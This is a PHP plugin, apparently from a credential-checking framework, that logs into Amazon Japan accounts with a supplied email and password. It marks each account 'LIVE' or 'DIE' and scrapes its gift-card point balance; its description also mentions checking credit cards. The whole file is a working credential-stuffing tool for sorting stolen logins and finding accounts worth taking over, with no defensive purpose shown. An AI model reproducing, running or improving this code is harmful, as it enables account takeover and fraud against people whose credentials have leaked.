<?php
class check_amazonjp extends plugins {
	public $id = "amazonjp";
	public $name = "Check amazon japan";
	public $version = "1.0.0";
	public $descrition = "Check amazon japan acc, points and credit cards";

	public $fields = array(
		"status" => "str",
		#"cards" => "str",
		"point" => "int",
	);

	public function check($user,$pass,$request) {
		return $this->runCheck($user,$pass,isset($request['cards']),isset($request['point']));
	}

	private function runCheck($m,$p,$check_card=false,$check_point=false) {
		// delete old cookie
		$this->startSession();

		$return = array();

		$ref = "https://www.amazon.co.jp/";

		if (!preg_match('/[\\\'\"](\/gp\/navigation\/redirector\.html\/ref\=sign\-in\-redirect.+?)[\\\'\"]/i',$this->connect($ref),$match)) {
			$return['status'] = "ERROR";
			return $return;
		}

		$url = "https://www.amazon.co.jp" . $match[1];

		$html = $this->connect($url,$ref,null,array("no_header"=>true));
		$data = $this->get_field($html,"signIn");

		$data["create"] = 0;
		$data["email"] = $m;
		$data["password"] = $p;

		$html = $this->connect("https://www.amazon.co.jp/ap/signin",$url,$data,array("header_only" => true));

		if (strpos($html, 'Location: https://www.amazon.co.jp?ie=UTF8&ref_=nav_ya_signin&') === false) {
			$return['status'] = "DIE";
			return $return;
		}

		if ($check_point) {
			$html = $this->connect("https://www.amazon.co.jp/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc","https://www.amazon.co.jp/");
			$html = mb_convert_encoding($html, "UTF-8", "Shift_JIS");
			if (preg_match('/<span>￥ ([0-9]+)<\/span/',$html,$match)) {
				$return['point'] = str_replace(",","",$match[1]);
			} else {
				$return['point'] = $html;
			}
		}

		$return['status'] = "LIVE";
		return $return;
	}

}
?>
